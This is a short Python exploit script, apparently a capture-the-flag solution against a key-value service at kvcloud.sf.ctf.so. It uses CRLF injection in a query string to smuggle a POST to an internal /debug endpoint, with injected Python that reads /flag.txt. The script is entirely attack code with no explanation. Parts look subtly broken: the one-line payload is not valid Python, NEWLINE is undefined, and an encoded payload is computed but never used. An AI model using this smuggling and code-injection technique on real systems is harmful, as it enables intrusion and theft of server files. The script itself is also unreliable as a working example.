from urllib.parse import quote_plus, urlencode
import requests

py_payload = "import io; from flask import send_file; with open('/flag.txt', 'rb') as f: fdata = io.BytesIO(NEWLINE + f.read()); send_file(fdata, 'text/plain')"
enc_py_payload = urlencode({'cmd': py_payload})
post_payload = "POST /debug HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\n\r\n{}".format(len(enc_py_payload), enc_py_payload)
partial_get_req = "http://localhost:80/ HTTP/1.1\r\nHost: localhost\r\nkeep-Alive: timeout=15,max=1000\r\nTransfer-Encoding: chunked\r\n0"
payload = partial_get_req + "\r\n\r\n" + post_payload
enc_payload = quote_plus(payload)
url = "http://kvcloud.sf.ctf.so/get?redis_addr%3D%2Fdebug&redis_port%3D80&key={}".format(payload)
print(url)

response = requests.request("Get",url)
print(response.text)